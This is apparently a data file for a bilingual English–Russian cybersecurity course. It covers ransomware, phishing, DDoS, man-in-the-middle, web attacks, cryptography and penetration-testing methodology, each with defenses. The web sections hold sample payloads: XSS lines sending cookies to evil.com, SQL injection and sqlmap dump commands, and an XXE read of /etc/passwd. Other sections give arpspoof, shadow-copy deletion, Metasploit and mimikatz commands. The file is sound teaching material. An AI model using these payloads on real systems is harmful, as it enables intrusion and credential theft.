      { heading: "How Ransomware Works", body: `Ransomware encrypts victim's files and demands payment for decryption key.\n\nTypical attack chain:\n1. Initial Access: Phishing, RDP brute-force, or exploitation\n2. Execution: Macro, PowerShell, or exploit\n3. Persistence: Registry run keys, scheduled tasks, WMI\n4. Lateral Movement: Stolen credentials, Pass-the-Hash, PsExec\n5. Defense Evasion: Disable Defender, delete shadow copies (vssadmin delete shadows /all)\n6. Data Exfiltration: For double extortion\n7. Encryption: AES for files, RSA to protect AES key\n8. Ransom Note: Demands Bitcoin` },
      { heading: "Notable Ransomware Families", body: `WannaCry (2017): EternalBlue SMB exploit. 230,000 victims. $4B damages. Kill switch found by Marcus Hutchins.\n\nNotPetya (2017): Disguised as ransomware, actually a wiper. Spread via MeDoc update. $10B damages.\n\nRyuk (2018+): Targeted enterprises/healthcare. Used TrickBot/Emotet loaders. Average ransom $1M+.\n\nREVIL/Sodinokibi: RaaS. Kaseya VSA supply chain attack (July 2021) — 1,500 businesses. $70M demand.\n\nConti (2020-2022): Leaked its own playbooks. Attacked Ireland's HSE in 2021.` },
      { heading: "Defense & Recovery", body: `Prevention:\n• 3-2-1 backup rule: 3 copies, 2 media types, 1 offsite\n• Email filtering and phishing training\n• Patch SMB, RDP, VPN urgently\n• Disable RDP if unused; MFA if used\n• Principle of least privilege\n• Network segmentation\n• EDR solutions\n\nResponse:\n• Isolate infected systems immediately\n• Do NOT pay the ransom\n• Restore from clean backups\n• Check nomoreransom.org for free decryptors` }
    ],
    sections_ru: [
      { heading: "Как работает программа-вымогатель", body: `Программа-вымогатель шифрует файлы жертвы и требует выкуп за ключ расшифровки.\n\nТипичная цепочка атаки:\n1. Первоначальный доступ: фишинг, брутфорс RDP, эксплуатация уязвимостей\n2. Выполнение: макрос, PowerShell или эксплойт\n3. Закрепление: ключи автозапуска реестра, задачи планировщика, WMI\n4. Горизонтальное перемещение: украденные учётные данные, Pass-the-Hash, PsExec\n5. Уклонение: отключение Defender, удаление теневых копий (vssadmin delete shadows /all)\n6. Эксфильтрация данных: для двойного вымогательства\n7. Шифрование: AES для файлов, RSA для защиты ключа AES\n8. Записка с требованием выкупа: требование оплаты в Bitcoin` },
      { heading: "Известные семейства программ-вымогателей", body: `WannaCry (2017): Эксплойт EternalBlue (SMB). 230 000 жертв. Ущерб $4 млрд. Аварийная остановка найдена Маркусом Хатчинсом.\n\nNotPetya (2017): Замаскирован под вымогателя, фактически — вайпер. Распространился через обновление MeDoc. Ущерб $10 млрд.\n\nRyuk (2018+): Целевые атаки на предприятия и больницы. Использовал загрузчики TrickBot/Emotet. Средний выкуп $1 млн+.\n\nREVIL/Sodinokibi: RaaS-операция. Атака цепочки поставок Kaseya VSA (июль 2021) — 1 500 компаний. Требование $70 млн.\n\nConti (2020–2022): Опубликовал собственные методички. Атаковал ирландскую систему здравоохранения HSE в 2021 году.` },
      { heading: "Защита и восстановление", body: `Профилактика:\n• Правило резервного копирования 3-2-1: 3 копии, 2 носителя, 1 вне площадки\n• Фильтрация почты и тренинги по фишингу\n• Срочно патчить SMB, RDP, VPN\n• Отключить RDP если не нужен; MFA если нужен\n• Принцип минимальных привилегий\n• Сегментация сети\n• EDR-решения\n\nРеагирование:\n• Немедленно изолировать заражённые системы\n• НЕ платить выкуп\n• Восстановление из чистых резервных копий\n• Проверить nomoreransom.org для бесплатных дешифраторов` }
    ]
  },

  {
    id: "phishing",
    category: "Threats & Attacks",
    title: "Phishing & Social Engineering",
    icon: "skull",
    sections: [
      { heading: "Phishing Overview", body: `Phishing is a social engineering attack where attackers impersonate trusted entities to steal credentials or install malware. According to the Verizon DBIR, phishing is involved in over 36% of data breaches.` },
      { heading: "Types of Phishing", body: `Phishing: Mass untargeted emails impersonating banks, PayPal, Office 365.\nSpear Phishing: Highly targeted, personalized using researched details.\nWhaling: Targeting C-level executives for wire transfers.\nVishing: Phone calls impersonating tech support, IRS, banks.\nSmishing: SMS with malicious links.\nBEC (Business Email Compromise): $43 billion in losses 2016-2021 (FBI IC3).\nQRshing: Malicious URLs in QR codes.\nAngler Phishing: Fake social media customer service accounts.` },
      { heading: "Phishing Indicators", body: `• Urgency ("Your account will be closed in 24 hours!")\n• Generic greetings ("Dear Customer")\n• Suspicious sender (support@paypa1.com)\n• Hover reveals different URL from displayed text\n• Poor grammar/spelling\n• Requests for credentials or financial data\n• Unexpected attachments` },
      { heading: "Social Engineering Techniques", body: `Pretexting: Fabricated scenario to extract information.\nBaiting: Infected USB drives left in public.\nQuid Pro Quo: Service offered for information.\nTailgating: Following authorized personnel into secured areas.\nScareware: Fake alerts claiming infection.\n\nPsychological principles exploited:\n• Authority, Scarcity/Urgency, Social Proof, Reciprocity, Liking` },
      { heading: "Defense", body: `Technical:\n• SPF, DKIM, DMARC anti-spoofing records\n• URL filtering and email attachment sandboxing\n• Multi-Factor Authentication (MFA)\n• Browser warnings (Google Safe Browsing)\n\nHuman:\n• Regular security awareness training\n• Phishing simulation (KnowBe4, GoPhish)\n• Verification procedures for sensitive requests` }
    ],
    sections_ru: [
      { heading: "Обзор фишинга", body: `Фишинг — атака социальной инженерии, при которой злоумышленники выдают себя за доверенные организации для кражи учётных данных или установки вредоносного ПО. По данным Verizon DBIR, фишинг причастен к более чем 36% утечек данных.` },
      { heading: "Виды фишинга", body: `Фишинг: Массовые нецелевые письма от имени банков, PayPal, Office 365.\nСпир-фишинг: Высококонкретизированные персональные атаки с использованием собранной информации о цели.\nУэйлинг: Атаки на топ-менеджеров для организации несанкционированных платежей.\nВишинг: Телефонные звонки от имени технической поддержки, налоговой, банков.\nСмишинг: SMS с вредоносными ссылками.\nКомпрометация деловой электронной почты (BEC): Убытки $43 млрд за 2016–2021 гг. (ФБР IC3).\nQR-фишинг: Вредоносные URL в QR-кодах.\nАнгельский фишинг: Поддельные аккаунты службы поддержки в соцсетях.` },
      { heading: "Признаки фишинга", body: `• Срочность («Ваш аккаунт будет закрыт через 24 часа!»)\n• Обезличенные приветствия («Уважаемый клиент»)\n• Подозрительный отправитель (support@paypa1.com)\n• При наведении на ссылку — другой URL\n• Орфографические и грамматические ошибки\n• Запросы учётных данных или финансовой информации\n• Неожиданные вложения` },
      { heading: "Техники социальной инженерии", body: `Претекстинг: создание вымышленного сценария для получения информации.\nНаживка: заражённые USB-накопители в публичных местах.\nУслуга в обмен на информацию (Quid Pro Quo).\nТейлгейтинг: проход в защищённые зоны вслед за авторизованным сотрудником.\nСкерваре: поддельные предупреждения о заражении.\n\nИспользуемые психологические принципы:\n• Авторитет, Дефицит/Срочность, Социальное доказательство, Взаимность, Симпатия` },
      { heading: "Защита", body: `Технические меры:\n• Записи SPF, DKIM, DMARC против подделки отправителя\n• Фильтрация URL и песочница для вложений\n• Многофакторная аутентификация (MFA)\n• Браузерные предупреждения (Google Safe Browsing)\n\nРабота с персоналом:\n• Регулярные тренинги по осведомлённости о безопасности\n• Симуляции фишинга (KnowBe4, GoPhish)\n• Процедуры верификации для чувствительных запросов` }
    ]
  },

  {
    id: "ddos",
    category: "Threats & Attacks",
    title: "DDoS Attacks",
    icon: "skull",
    sections: [
      { heading: "What is a DDoS Attack?", body: `A Distributed Denial of Service (DDoS) attack disrupts normal traffic by overwhelming a target with traffic from multiple sources (a botnet). Measured in Gbps or PPS.` },
      { heading: "Types of DDoS Attacks", body: `Volumetric: Saturate bandwidth.\n• UDP Flood, ICMP Flood, DNS Amplification (28-54x), NTP Amplification (556x)\n\nProtocol: Exhaust server resources.\n• SYN Flood: fills connection table\n• Ping of Death: oversized ICMP\n• Smurf Attack: spoofed ICMP broadcast\n\nApplication Layer (L7): Target web server.\n• HTTP Flood: high-volume GET/POST requests\n• Slowloris: keeps connections open with partial headers\n• ReDoS: vulnerable regex exploitation` },
      { heading: "Defense & Mitigation", body: `• CDN with DDoS protection (Cloudflare, AWS Shield, Akamai)\n• Rate limiting at network edge\n• Anycast diffusion across global network\n• Scrubbing centers — filter attack traffic\n• SYN Cookies — handle SYN flood without state\n• Black hole routing (null route attack traffic)` }
    ],
    sections_ru: [
      { heading: "Что такое DDoS-атака?", body: `DDoS-атака (Распределённый отказ в обслуживании) нарушает нормальную работу сервиса путём перегрузки цели трафиком из множества источников (ботнет). Измеряется в Гбит/с или пакетах в секунду (PPS).` },
      { heading: "Типы DDoS-атак", body: `Объёмные: насыщение пропускной способности.\n• UDP-флуд, ICMP-флуд, DNS-амплификация (28–54x), NTP-амплификация (556x)\n\nПротокольные: исчерпание ресурсов сервера.\n• SYN-флуд: заполнение таблицы полуоткрытых соединений\n• Ping of Death: переполненные ICMP-пакеты\n• Атака Смурфа: поддельные ICMP широковещательные пакеты\n\nПрикладного уровня (L7): атаки на веб-сервер.\n• HTTP-флуд: массовые GET/POST запросы\n• Slowloris: удержание соединений с неполными заголовками\n• ReDoS: эксплуатация уязвимых регулярных выражений` },
      { heading: "Защита и смягчение", body: `• CDN с защитой от DDoS (Cloudflare, AWS Shield, Akamai)\n• Ограничение скорости запросов на периметре сети\n• Anycast-рассеивание трафика по глобальной сети\n• Центры «очистки» трафика (scrubbing centers)\n• SYN Cookies — обработка SYN-флуда без хранения состояний\n• Маршрутизация в «чёрную дыру» (null route атакующего трафика)` }
    ]
  },

  {
    id: "mitm",
    category: "Threats & Attacks",
    title: "Man-in-the-Middle Attacks",
    icon: "skull",
    sections: [
      { heading: "Overview", body: `A MitM attack occurs when an attacker secretly intercepts and potentially alters communications between two parties who believe they're communicating directly.` },
      { heading: "ARP Spoofing/Poisoning", body: `ARP has no authentication. Attacker sends gratuitous ARP replies associating their MAC with gateway's IP. All victim traffic flows through attacker.\n\nTools: Arpspoof, Ettercap, Bettercap\narpspoof -i eth0 -t [victim_ip] [gateway_ip]\n\nDefense: Dynamic ARP Inspection (DAI) on managed switches, static ARP entries.` },
      { heading: "SSL Stripping", body: `Downgrades HTTPS to HTTP.\n\nSteps: ARP spoof → intercept HTTPS request → connect to real site via HTTPS → serve victim HTTP version.\n\nTool: sslstrip\nDefense: HSTS preloading — browsers refuse HTTP connections to HSTS sites.` },
      { heading: "Evil Twin / Rogue AP", body: `Rogue Wi-Fi AP mimicking legitimate one (same SSID). Sends deauth frames to force victims to connect.\n\nTool: hostapd-wpe, WiFi-Pumpkin\nDefense: Certificate pinning, VPN on untrusted networks, 802.1X enterprise auth.` }
    ],
    sections_ru: [
      { heading: "Обзор", body: `Атака «Человек посередине» (MitM) происходит, когда злоумышленник тайно перехватывает и потенциально изменяет переписку между двумя сторонами, которые считают, что общаются напрямую.` },
      { heading: "ARP-спуфинг / Отравление ARP", body: `ARP не имеет аутентификации. Злоумышленник отправляет поддельные ARP-ответы, связывая свой MAC-адрес с IP-адресом шлюза. Весь трафик жертвы проходит через злоумышленника.\n\nИнструменты: Arpspoof, Ettercap, Bettercap\narpspoof -i eth0 -t [IP_жертвы] [IP_шлюза]\n\nЗащита: Dynamic ARP Inspection (DAI) на управляемых коммутаторах, статические ARP-записи.` },
      { heading: "SSL Stripping (Снятие SSL)", body: `Понижает HTTPS до HTTP.\n\nШаги: ARP-спуфинг → перехват HTTPS-запроса → подключение к реальному сайту по HTTPS → передача жертве HTTP-версии.\n\nИнструмент: sslstrip\nЗащита: HSTS preloading — браузеры отказываются от HTTP-соединений для HSTS-сайтов.` },
      { heading: "Злой двойник / Мошенническая точка доступа", body: `Поддельная Wi-Fi точка доступа, имитирующая легитимную (тот же SSID). Отправляет фреймы деаутентификации, вынуждая жертв подключиться.\n\nИнструменты: hostapd-wpe, WiFi-Pumpkin\nЗащита: закрепление сертификатов (Certificate Pinning), VPN в ненадёжных сетях, корпоративная аутентификация 802.1X.` }
    ]
  },

  // ─── WEB APPLICATION SECURITY ──────────────────────────────────────
  {
    id: "sql_injection",
    category: "Web Application Security",
    title: "SQL Injection (SQLi)",
    icon: "web",
    sections: [
      { heading: "What is SQL Injection?", body: `SQL Injection is a code injection attack where malicious SQL is inserted into input fields to manipulate the database. Consistently #1-3 in OWASP Top 10.\n\nVulnerable code (PHP):\n$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";` },
      { heading: "Types of SQL Injection", body: `In-Band:\n• Error-Based: ' OR 1=1-- - | Force DB errors\n• UNION-Based: ' UNION SELECT username,password FROM users--\n\nBlind:\n• Boolean: ' AND 1=1-- - (true) | ' AND 1=2-- - (false)\n• Time-Based: ' AND SLEEP(5)-- - (MySQL)\n\nOut-of-Band: Exfiltrate via DNS/HTTP (requires xp_cmdshell or UTL_HTTP).` },
      { heading: "SQLi Attack Techniques", body: `Auth Bypass: admin'-- -\nResult: SELECT * FROM users WHERE user='admin'-- AND pass='anything'\n\nUNION extraction:\n1. Find columns: ' ORDER BY 1-- -\n2. Find displayable: ' UNION SELECT NULL,NULL,NULL-- -\n3. Extract: ' UNION SELECT username,password,NULL FROM users-- -\n\nSQLMap:\nsqlmap -u "http://target.com/page?id=1" --dbs\nsqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump` },
      { heading: "Defense Against SQLi", body: `1. Prepared Statements (PRIMARY DEFENSE):\nPHP: $stmt = $pdo->prepare('SELECT * FROM users WHERE user = ?'); $stmt->execute([$user]);\n\n2. Input Validation — whitelist allowances\n3. Least Privilege — DB account with minimum permissions\n4. WAF (ModSecurity, AWS WAF) — defense-in-depth only\n5. Never expose database error messages to users` }
    ],
    sections_ru: [
      { heading: "Что такое SQL-инъекция?", body: `SQL-инъекция — атака внедрением кода, при которой вредоносный SQL вставляется в поля ввода для манипуляции базой данных. Неизменно входит в OWASP Top 10 на позиции 1–3.\n\nУязвимый код (PHP):\n$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";` },
      { heading: "Типы SQL-инъекций", body: `Полосовые (In-Band):\n• На основе ошибок: ' OR 1=1-- - | Вызываем ошибки БД\n• UNION-метод: ' UNION SELECT username,password FROM users--\n\nСлепые (Blind):\n• Булева: ' AND 1=1-- - (истина) | ' AND 1=2-- - (ложь)\n• Временная: ' AND SLEEP(5)-- - (MySQL)\n\nВнеполосные (Out-of-Band): эксфильтрация через DNS/HTTP (требует xp_cmdshell или UTL_HTTP).` },
      { heading: "Техники атак SQLi", body: `Обход аутентификации: admin'-- -\nРезультат: SELECT * FROM users WHERE user='admin'-- AND pass='что угодно'\n\nИзвлечение через UNION:\n1. Найти количество столбцов: ' ORDER BY 1-- -\n2. Найти отображаемые: ' UNION SELECT NULL,NULL,NULL-- -\n3. Извлечь данные: ' UNION SELECT username,password,NULL FROM users-- -\n\nSQLMap:\nsqlmap -u "http://target.com/page?id=1" --dbs\nsqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump` },
      { heading: "Защита от SQLi", body: `1. Подготовленные запросы (ОСНОВНАЯ ЗАЩИТА):\nPHP: $stmt = $pdo->prepare('SELECT * FROM users WHERE user = ?'); $stmt->execute([$user]);\n\n2. Валидация ввода — белые списки допустимых значений\n3. Минимальные привилегии — учётная запись БД с минимальными правами\n4. WAF (ModSecurity, AWS WAF) — только эшелонированная защита\n5. Никогда не показывать ошибки БД пользователям` }
    ]
  },

  {
    id: "xss",
    category: "Web Application Security",
    title: "Cross-Site Scripting (XSS)",
    icon: "web",
    sections: [
      { heading: "What is XSS?", body: `Client-side injection attack where malicious scripts execute in victims' browsers. Can steal cookies, redirect users, log keystrokes. OWASP Top 10 #3.` },
      { heading: "Types of XSS", body: `Reflected (Non-Persistent): Script reflected in immediate response. Delivered via malicious link.\nURL: http://site.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>\n\nStored (Persistent): Script stored on server in database/comment. Every user executes it.\n\nDOM-Based: Vulnerability in client-side JS processing attacker-controlled sources.\ndocument.getElementById('d').innerHTML = location.hash.substring(1)` },
      { heading: "XSS Payloads & Defense", body: `Payloads:\n<img src=x onerror=alert(1)>\n<svg onload=fetch('https://evil.com/?c='+document.cookie)>\n\nDefense:\n• Output Encoding: < → &lt; > → &gt;\n• CSP: Content-Security-Policy: default-src 'self'\n• HttpOnly cookies: Set-Cookie: id=abc; HttpOnly; Secure\n• Use React/Angular/Vue (auto-encode output)` }
    ],
    sections_ru: [
      { heading: "Что такое XSS?", body: `Атака внедрения кода на стороне клиента, при которой вредоносные скрипты выполняются в браузерах жертв. Позволяет похищать куки, перенаправлять пользователей, записывать нажатия клавиш. OWASP Top 10 #3.` },
      { heading: "Типы XSS", body: `Отражённый (непостоянный): скрипт отражается в немедленном ответе. Доставляется через вредоносную ссылку.\nURL: http://site.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>\n\nХранимый (постоянный): скрипт сохраняется на сервере в базе/комментарии. Выполняется у каждого посетителя.\n\nDOM-based: Уязвимость в клиентском JavaScript, обрабатывающем данные из контролируемых злоумышленником источников.\ndocument.getElementById('d').innerHTML = location.hash.substring(1)` },
      { heading: "Нагрузки XSS и защита", body: `Нагрузки:\n<img src=x onerror=alert(1)>\n<svg onload=fetch('https://evil.com/?c='+document.cookie)>\n\nЗащита:\n• Экранирование вывода: < → &lt; > → &gt;\n• CSP: Content-Security-Policy: default-src 'self'\n• Флаг HttpOnly для куки: Set-Cookie: id=abc; HttpOnly; Secure\n• Использование React/Angular/Vue (автоматическое экранирование вывода)` }
    ]
  },

  {
    id: "csrf",
    category: "Web Application Security",
    title: "CSRF, SSRF & Other Web Attacks",
    icon: "web",
    sections: [
      { heading: "CSRF", body: `CSRF tricks a victim's browser into making unauthorized requests to a web app where they're authenticated.\n\nAttack: <img src="https://bank.com/transfer?to=attacker&amount=10000">\n\nDefense: CSRF Tokens, SameSite=Strict cookies, Origin/Referer validation.` },
      { heading: "SSRF", body: `SSRF forces the server to make HTTP requests to internal resources.\n\nExample: http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/\n\nBypass techniques:\n• http://0177.0.0.1/ (octal IP) instead of 127.0.0.1\n• DNS rebinding, file://, dict://, gopher://\n\nDefense: Whitelist allowed domains, block RFC 1918 addresses.` },
      { heading: "XXE Injection", body: `Exploits vulnerable XML parsers.\n\nPayload:\n<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>\n\nDefense: Disable external entity processing. Use JSON instead.` },
      { heading: "IDOR (Broken Access Control)", body: `IDOR: User-controllable input directly accesses objects without authorization check.\n\nExample: /account?id=1234 → change to /account?id=1235 to see another user's data.\n\nDefense: Check authorization on every request. Verify user owns the resource.` }
    ],
    sections_ru: [
      { heading: "CSRF", body: `CSRF вынуждает браузер жертвы делать несанкционированные запросы к веб-приложению, в котором пользователь уже аутентифицирован.\n\nАтака: <img src="https://bank.com/transfer?to=attacker&amount=10000">\n\nЗащита: CSRF-токены, SameSite=Strict для куки, проверка заголовков Origin/Referer.` },
      { heading: "SSRF", body: `SSRF вынуждает сервер делать HTTP-запросы к внутренним ресурсам.\n\nПример: http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/\n\nМетоды обхода:\n• http://0177.0.0.1/ (восьмеричный IP) вместо 127.0.0.1\n• DNS Rebinding, file://, dict://, gopher://\n\nЗащита: белый список разрешённых доменов, блокировка адресов RFC 1918.` },
      { heading: "XXE-инъекция", body: `Эксплуатирует уязвимые XML-парсеры.\n\nНагрузка:\n<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>\n\nЗащита: отключить обработку внешних сущностей. Использовать JSON вместо XML.` },
      { heading: "IDOR (Нарушение контроля доступа)", body: `IDOR: контролируемый пользователем ввод напрямую обращается к объектам без проверки авторизации.\n\nПример: /account?id=1234 → смена на /account?id=1235 показывает данные другого пользователя.\n\nЗащита: проверять авторизацию при каждом запросе. Убедиться, что пользователь является владельцем ресурса.` }
    ]
  },

  // ─── CRYPTOGRAPHY ──────────────────────────────────────────────────
  {
    id: "crypto_fundamentals",
    category: "Cryptography",
    title: "Cryptography Fundamentals",
    icon: "key",
    sections: [
      { heading: "Core Concepts", body: `Cryptography is the science of secure communication in the presence of adversaries.\n\nKey terminology:\n• Plaintext: Readable data\n• Ciphertext: Encrypted data\n• Key: Secret parameter controlling encryption\n• Cipher: Encryption algorithm\n• Encryption: Plaintext → Ciphertext\n• Decryption: Ciphertext → Plaintext` },
      { heading: "Symmetric Encryption", body: `Same key for encryption and decryption. Fast — used for large amounts of data.\n\nAES: Block cipher, 128-bit blocks, 128/192/256-bit keys. Gold standard.\n\nModes of Operation:\n• ECB: INSECURE — identical blocks produce identical ciphertext\n• CBC: XOR with previous ciphertext, requires IV\n• CTR: Stream cipher mode, parallelizable\n• GCM: CTR + authentication — RECOMMENDED\n\nChaCha20-Poly1305: Alternative to AES-GCM, faster in software.` },
      { heading: "Asymmetric Encryption", body: `Key pair: public key (freely shared) + private key (kept secret).\n\nRSA: Based on difficulty of factoring large numbers. Min 2048-bit.\nECC: Elliptic curves. 256-bit ECC ≈ 3072-bit RSA. More efficient.\nDiffie-Hellman: Shared secret over insecure channel. Use Authenticated DH.\n\nIn practice: asymmetric for key exchange, symmetric for bulk data (TLS model).` },
      { heading: "Hash Functions", body: `Properties: deterministic, one-way, collision-resistant, avalanche effect.\n\nMD5 (128-bit): BROKEN — collision attacks. Never use.\nSHA-1 (160-bit): BROKEN — SHAttered attack (2017). Deprecated.\nSHA-256: Currently secure. Bitcoin, TLS, code signing.\nSHA-3 (Keccak): Backup algorithm family.\nbcrypt/Argon2: Password hashing — deliberately slow, memory-hard.` },
      { heading: "TLS/SSL Handshake", body: `TLS 1.3 Handshake:\n1. Client Hello: TLS version, cipher suites, random value\n2. Server Hello: Chosen cipher, certificate, random value\n3. Certificate Verification: Against trusted CA\n4. Key Exchange: ECDHE for Perfect Forward Secrecy\n5. Finished: Authentication tags\n6. Application Data: Encrypted\n\nCommon vulnerabilities:\n• BEAST (TLS 1.0 CBC) — upgrade to TLS 1.2+\n• POODLE (SSL 3.0) — disable SSL 3.0\n• HEARTBLEED (OpenSSL memory disclosure)\n• DROWN (SSLv2) — disable everywhere` }
    ],
    sections_ru: [
      { heading: "Основные концепции", body: `Криптография — наука о безопасной коммуникации в присутствии злоумышленников.\n\nОсновные термины:\n• Открытый текст (Plaintext): читаемые данные\n• Шифртекст (Ciphertext): зашифрованные данные\n• Ключ: секретный параметр управления шифрованием\n• Шифр: алгоритм шифрования\n• Шифрование: открытый текст → шифртекст\n• Дешифрование: шифртекст → открытый текст` },
      { heading: "Симметричное шифрование", body: `Один ключ для шифрования и дешифрования. Быстрое — используется для больших объёмов данных.\n\nAES: блочный шифр, блоки 128 бит, ключи 128/192/256 бит. Золотой стандарт.\n\nРежимы работы:\n• ECB: НЕБЕЗОПАСЕН — одинаковые блоки дают одинаковый шифртекст\n• CBC: XOR с предыдущим шифртекстом, требует IV\n• CTR: режим поточного шифра, распараллеливается\n• GCM: CTR + аутентификация — РЕКОМЕНДУЕТСЯ\n\nChaCha20-Poly1305: альтернатива AES-GCM, быстрее в программной реализации.` },
      { heading: "Асимметричное шифрование", body: `Пара ключей: открытый (публичный) + закрытый (приватный).\n\nRSA: основан на сложности факторизации больших чисел. Минимум 2048 бит.\nECC: эллиптические кривые. 256-битный ECC ≈ 3072-битному RSA. Эффективнее.\nDiffie-Hellman: общий секрет через незащищённый канал. Использовать аутентифицированный DH.\n\nНа практике: асимметричное для обмена ключами, симметричное для передачи данных (модель TLS).` },
      { heading: "Хеш-функции", body: `Свойства: детерминированность, необратимость, устойчивость к коллизиям, лавинный эффект.\n\nMD5 (128 бит): ВЗЛОМАН — атаки коллизий. Не использовать.\nSHA-1 (160 бит): ВЗЛОМАН — атака SHAttered (2017). Устарел.\nSHA-256: в настоящее время безопасен. Bitcoin, TLS, подписание кода.\nSHA-3 (Keccak): резервное семейство алгоритмов.\nbcrypt/Argon2: хеширование паролей — намеренно медленное, требует памяти.` },
      { heading: "Рукопожатие TLS/SSL", body: `Рукопожатие TLS 1.3:\n1. Client Hello: версия TLS, наборы шифров, случайное значение\n2. Server Hello: выбранный шифр, сертификат, случайное значение\n3. Верификация сертификата: проверка у доверенного CA\n4. Обмен ключами: ECDHE для прямой секретности (PFS)\n5. Finished: метки аутентификации\n6. Данные приложения: зашифрованная передача\n\nИзвестные уязвимости:\n• BEAST (TLS 1.0 CBC) — обновиться до TLS 1.2+\n• POODLE (SSL 3.0) — отключить SSL 3.0\n• HEARTBLEED (утечка памяти OpenSSL)\n• DROWN (SSLv2) — отключить везде` }
    ]
  },

  // ─── PENETRATION TESTING ───────────────────────────────────────────
  {
    id: "pentest_methodology",
    category: "Penetration Testing",
    title: "Penetration Testing Methodology",
    icon: "terminal",
    sections: [
      { heading: "What is Penetration Testing?", body: `Authorized simulated cyberattack to evaluate security by exploiting vulnerabilities.\n\nTypes by scope:\n• Black Box: No prior knowledge (external attacker simulation)\n• White Box: Full knowledge (most thorough)\n• Gray Box: Partial knowledge (insider simulation)\n\nKey legal requirement: ALWAYS obtain written authorization before testing.` },
      { heading: "Phase 1: Reconnaissance", body: `Passive Recon (no direct target interaction):\n• WHOIS: whois example.com\n• DNS: dig, nslookup, dnsrecon\n• Google Dorking: site:, filetype:, inurl:\n• Shodan.io: internet-connected device search\n• theHarvester: emails, subdomains, hosts\n• crt.sh: Certificate Transparency for subdomains\n\nActive Recon:\n• nmap -sV -sC target.com\n• gobuster dns -d target.com -w wordlist.txt` },
      { heading: "Phase 2: Scanning & Enumeration", body: `Vulnerability Scanning:\n• Nessus: 140,000+ plugins\n• OpenVAS: Open-source alternative\n• Nikto: nikto -h target.com\n\nWeb Enumeration:\n• gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n• ffuf -w wordlist.txt -u http://target.com/FUZZ\n\nSMB: enum4linux -a target.com | smbmap -H target.com\nLDAP: ldapsearch -x -H ldap://dc.domain.com -b "DC=domain,DC=com"` },
      { heading: "Phase 3: Exploitation", body: `Metasploit workflow:\nmsfconsole\nsearch [vulnerability]\nuse [module]\nset RHOSTS [target]\nset LHOST [your IP]\nrun\n\nPayloads:\n• singles: self-contained shellcode\n• staged: stager downloads larger stage\n• meterpreter: advanced in-memory payload\n\nMeterpreter: sysinfo, getuid, getsystem, hashdump, screenshot` },
      { heading: "Phase 4: Post-Exploitation", body: `Linux PrivEsc:\n• sudo -l — list sudo permissions\n• find / -perm -4000 2>/dev/null — SUID binaries\n• LinPEAS / LinEnum\n• GTFOBins: https://gtfobins.github.io\n\nWindows PrivEsc:\n• whoami /priv\n• WinPEAS\n• LOLBAS: https://lolbas-project.github.io\n\nLateral Movement:\n• Pass-the-Hash: mimikatz sekurlsa::pth\n• PsExec, WMI, PowerShell Remoting` },
      { heading: "Phase 5: Reporting", body: `Report structure:\n1. Executive Summary (non-technical, risk posture)\n2. Scope & Methodology\n3. Risk Rating (CVSS v3 scores)\n4. Findings (for each vulnerability: title, CVSS, description, PoC, impact, remediation)\n5. Remediation Roadmap\n6. Appendices\n\nCVSS v3: Critical 9.0-10.0 | High 7.0-8.9 | Medium 4.0-6.9 | Low 0.1-3.9` }
    ],
    sections_ru: [
      { heading: "Что такое тест на проникновение?", body: `Авторизованная имитация кибератаки для оценки безопасности путём эксплуатации уязвимостей.\n\nТипы по охвату:\n• Чёрный ящик: без предварительных знаний (имитация внешней атаки)\n• Белый ящик: полные знания о системе (наиболее тщательный)\n• Серый ящик: частичные знания (имитация инсайдера)\n\nКлючевое правовое требование: ВСЕГДА получать письменное разрешение до начала тестирования.` },
      { heading: "Фаза 1: Разведка", body: `Пассивная разведка (без прямого взаимодействия с целью):\n• WHOIS: whois example.com\n• DNS: dig, nslookup, dnsrecon\n• Google-дорки: site:, filetype:, inurl:\n• Shodan.io: поиск подключённых к интернету устройств\n• theHarvester: emails, поддомены, хосты\n• crt.sh: прозрачность сертификатов для поиска поддоменов\n\nАктивная разведка:\n• nmap -sV -sC target.com\n• gobuster dns -d target.com -w wordlist.txt` },
      { heading: "Фаза 2: Сканирование и перечисление", body: `Сканирование уязвимостей:\n• Nessus: 140 000+ плагинов\n• OpenVAS: открытый аналог\n• Nikto: nikto -h target.com\n\nПеречисление веб-ресурсов:\n• gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n• ffuf -w wordlist.txt -u http://target.com/FUZZ\n\nSMB: enum4linux -a target.com | smbmap -H target.com\nLDAP: ldapsearch -x -H ldap://dc.domain.com -b "DC=domain,DC=com"` },
      { heading: "Фаза 3: Эксплуатация", body: `Рабочий процесс в Metasploit:\nmsfconsole\nsearch [уязвимость]\nuse [модуль]\nset RHOSTS [цель]\nset LHOST [ваш IP]\nrun\n\nТипы полезных нагрузок:\n• singles: самодостаточный шеллкод\n• staged: загрузчик скачивает основную нагрузку\n• meterpreter: продвинутая нагрузка в памяти\n\nМeterpreter: sysinfo, getuid, getsystem, hashdump, screenshot` },
      { heading: "Фаза 4: Пост-эксплуатация", body: `Повышение привилегий в Linux:\n• sudo -l — список разрешений sudo\n• find / -perm -4000 2>/dev/null — SUID-бинарники\n• LinPEAS / LinEnum\n• GTFOBins: https://gtfobins.github.io\n\nПовышение привилегий в Windows:\n• whoami /priv\n• WinPEAS\n• LOLBAS: https://lolbas-project.github.io\n\nГоризонтальное перемещение:\n• Pass-the-Hash: mimikatz sekurlsa::pth\n• PsExec, WMI, PowerShell Remoting` },
      { heading: "Фаза 5: Отчётность", body: `Структура отчёта:\n1. Исполнительное резюме (нетехническое, общая картина рисков)\n2. Область тестирования и методология\n3. Оценка рисков (баллы CVSS v3)\n4. Результаты (для каждой уязвимости: название, CVSS, описание, PoC, влияние, рекомендации)\n5. План устранения уязвимостей\n6. Приложения\n\nCVSS v3: Критический 9.0–10.0 | Высокий 7.0–8.9 | Средний 4.0–6.9 | Низкий 0.1–3.9` }
    ]
  },

